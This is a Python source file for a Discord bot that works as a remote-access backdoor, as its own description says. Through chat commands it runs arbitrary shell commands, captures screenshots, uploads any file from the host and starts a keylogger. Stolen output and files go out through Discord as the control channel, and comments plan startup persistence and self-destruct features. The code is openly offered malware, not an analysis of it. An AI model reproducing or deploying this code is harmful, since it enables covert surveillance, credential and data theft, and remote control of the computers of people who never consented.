from discord.ext import commands
from discord.ext.commands.errors import MissingRequiredArgument
import threading
import discord
import subprocess
import pyautogui
import time
import math
import os

# for keeping in-track of which bot
# is actually responding
nickname = '<nicknamehere>'

# discord variables (setting up prefix depending on nickname)
# to avoid multiple execution of command
bot = commands.Bot(command_prefix=(nickname + ' | '))
token = '<tokenhere>'

# for keeping track of the directory configuraton files
# keylogs : directory where keylogged strokes are to be stored
config_dir = {
	'keylogs' : '.',						# where logs of keystrokes will be saved
	'screenshots' : '.',					# where screenshots will be stored
	'hybrids' : '.'							# where command config will be placed
}

#####################################
#    ADDITIONAL NEEDED FUNCTIONS    #
#####################################
# made for limiting the buffer to be sent in discord
# returns array of strings that will be sent individualy
# as an output (discord limit <= 4000)
def limiter(str_input, limit):
	max = math.ceil(len(str_input) / limit)
	output = []

	# pops the first 3000 characters
	for i in range(max):
		output.append(str_input[:limit])
		str_input = str_input[limit:]

	return output

# whenever a key is pressed, do the ff.
def on_key_press(key):
	# look where to load the config files
	print (key)

#############################
#    EVENTS DEFINED HERE    #
#############################
@bot.event
async def on_ready():
	print ('[CommandBot] State : Ready!')



###############################
#    COMMANDS DEFINED HERE    #
###############################
@bot.command(
	brief='Tests if the bot is alive.',
	description='Checks if the bot is alive by sending a constant response.')

async def test(ctx):
	print (f'[CommandBot {nickname}] Test command called!')
	await ctx.send(f'[CommandBot {nickname}] BOT IS WORKING!')




# note: can be crashed if the argument has
# 4000+ size of message
@bot.command(
	brief='Tests if the bots recieve the messages properly',
	description='Tests if the commands recieved is recieved properly by replying the message back.'
)
async def ping(ctx, arg1):
	try:
		print (f'[CommandBot {nickname}] Ping response : {arg1}')
		await ctx.send(f'[CommandBot {nickname}] Responds {arg1}!')
	except MissingRequiredArgument:
		print (f'[CommandBot Err {nickname}] Wrong usage of ping')
		await ctx.send(f'[CommandBot {nickname}] Usage : ping <message>')




@bot.command(
	brief='Executes system shell with specified arguments.',
	description='Executes system shell (can be in kernel level if backdoor is ran as administrator)'
)
async def shell(ctx, *args):
	try:
		command_shell = list(args)
		await ctx.send(f'[CommandBot {nickname}] Execute shell { command_shell }')

		# get the output with subprocess
		proc = subprocess.Popen(command_shell, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		await ctx.send(f'Called subprocess....')

		output, error = proc.communicate()
		await ctx.send(f'[CommandBot {nickname}] Shell Output:')
		
		# limits the size of the output (limits 1500 texts)
		output_to_be_sent = limiter(output.decode(), 1500)
		for message in output_to_be_sent:
			await ctx.send(f'```{message}```')

		# for telling that this is finished
		await ctx.send(f'[CommandBot {nickname}] Shell Done.')

	except MissingRequiredArgument:
		print (f'[CommandBot {nickname}] problem in executing shell')
		await ctx.send(f'[CommandBot {nickname}] Usage : shell <cli command [args]>')




@bot.command(
	brief='Takes screenshot on user and sends output as file',
	description='Takes a screenshot from the user and sends file in the channel.\nThis uses pyautogui technology'
)
async def sshot(ctx):
	if (config_dir['screenshots'] == '.'):
		await ctx.send('[!] Cannot take screenshot, please assign config_dir')
		return

	# takes screenshot and save as 00000.png
	sshot = pyautogui.screenshot()
	sshot.save(config_dir['screenshots'] + '00000.png')

	# sends this file to the server
	await ctx.send(file=discord.File(config_dir['screenshots'] + '00000.png'))




@bot.command(
	brief='Uploads and gets the file on the specified path',
	description='This command gets the file from the specified path and uploads on the channel.'
)
async def get_file(ctx, file_path):
	try:
		if (os.path.isfile(file_path)):
			await ctx.send(file=discord.File(file_path))
		else:
			await ctx.send(f'[CommandBot {nickname}] File entered does not exist!')

	except MissingRequiredArgument:
		print (f'[CommandBot {nickname}] problem in finding file')
		await ctx.send(f'[CommandBot {nickname}] Usage : get_file <file path>')


@bot.command(
	brief='Starts Keylogger',
	description='Command that starts the keylogger and saves the file on config directory.'
)
async def keylog(ctx, timeout : int):
	from pynput.keyboard import Listener, Key

	await ctx.send(f'[CommandBot {nickname}] Starting keylogger')
	await ctx.send(f'[*] Text output will be saved at : {config_dir["keylogs"]}')
	if (config_dir['keylogs'] == '.'):
		await ctx.send('[~] Cannot start keylogger! Path to log is not assigned yet!')
		return

	# check if file already exists (create one if none)
	if (not os.path.isfile(config_dir['keylogs'] + '\\logs.txt')):
		open(config_dir['keylogs'] + '\\logs.txt', 'w').write(' ')

	# start the keylogger on this part
	with Listener(on_press=on_key_press) as listener:
		def stop_listening(time_stop):
			time.sleep(time_stop)
			listener.stop()

		# wait for n secs to stop the logging
		th = threading.Thread(target=stop_listening, args=(timeout,))
		th.start()

		th = threading.Thread(target=listener.join)
		th.start()

	await ctx.send(f'[*] Started keylogger for {timeout} seconds.')


@bot.command(
	brief='configuration path reading',
	description='command that assigns where the configuration files are being saved'
)
async def configlookup(ctx):
	await ctx.send(f'[CommandBot {nickname}] Directory configuration list :')
	await ctx.send(f"""```
The following are the paths where the logs will be pushed
============================================================
keylogs			{config_dir['keylogs']}
hybrids			{config_dir['hybrids']}
screenshots		{config_dir['screenshots']}
============================================================```""")

@bot.command(
	brief='Starts Keylogger',
	description='Command that starts the keylogger and saves the file on config directory.'
)
async def setconfig(ctx, key, value):
	if (key in config_dir):
		await ctx.send(f'[*] Assigning {key} : {value}')
		if (os.path.isdir(value)):
			config_dir[key] = value
			await ctx.send('[+] Value assigned!')
		else:
			await ctx.send('[!] Cannot add path, path does not exist!')
	else:
		await ctx.send('[~] Cannot assign value on that one')


# additional features : change directory, show config directories, inject startup
# keylog, change config directory values, delete file, self destruct
# add command

# start the bot
bot.run(token)